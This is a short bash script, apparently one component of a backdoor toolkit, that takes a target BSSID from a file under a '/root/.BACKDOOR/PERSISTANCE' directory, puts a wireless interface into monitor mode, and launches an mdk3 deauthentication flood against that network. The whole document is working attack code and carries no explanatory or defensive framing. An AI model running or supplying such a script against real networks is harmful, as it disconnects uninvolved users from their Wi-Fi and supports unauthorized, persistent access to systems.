#!/bin/bash
clear

# DEAUTH
cat /root/.BACKDOOR/PERSISTANCE/CONFIG.txt | cut -d ':' -f 7 > bssid.txt
iwconfig wlan1 mode monitor
mdk3 wlan1 d -b bssid.txt &
